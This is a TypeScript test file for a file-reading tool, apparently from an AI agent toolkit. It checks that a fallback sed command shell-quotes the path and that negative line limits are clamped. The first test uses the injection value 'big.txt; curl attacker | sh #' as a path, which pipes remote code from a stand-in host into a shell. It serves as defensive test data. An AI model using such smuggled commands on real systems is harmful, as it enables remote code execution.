import { Buffer } from "node:buffer";
import { describe, expect, it } from "vitest";
import { createReadToolDefinition } from "./read.js";
import { DEFAULT_MAX_BYTES } from "./truncate.js";

function textContent(
  result: Awaited<ReturnType<ReturnType<typeof createReadToolDefinition>["execute"]>>,
): string {
  const first = result.content[0];
  return first?.type === "text" ? (first.text ?? "") : "";
}

describe("read tool", () => {
  it("shell-quotes the long-first-line fallback path", async () => {
    const path = "big.txt; curl attacker | sh #";
    const tool = createReadToolDefinition("/workspace", {
      operations: {
        access: async () => {},
        detectImageMimeType: async () => null,
        readFile: async () => Buffer.from("x".repeat(DEFAULT_MAX_BYTES + 1)),
      },
    });

    const result = await tool.execute("call-1", { path }, undefined, undefined, {} as never);
    const text = result.content[0]?.type === "text" ? result.content[0].text : "";

    expect(text).toContain(`sed -n '1p' '${path}' | head -c ${DEFAULT_MAX_BYTES}`);
    expect(text).not.toContain(`sed -n '1p' ${path} | head`);
  });

  it("clamps non-positive line limits before slicing file content", async () => {
    const tool = createReadToolDefinition("/workspace", {
      operations: {
        access: async () => {},
        detectImageMimeType: async () => null,
        readFile: async () => Buffer.from("alpha\nbeta\ngamma"),
      },
    });

    const result = await tool.execute(
      "call-1",
      { path: "notes.txt", limit: -1 },
      undefined,
      undefined,
      {} as never,
    );

    expect(textContent(result)).toBe("alpha\n\n[2 more lines in file. Use offset=2 to continue.]");
  });
});
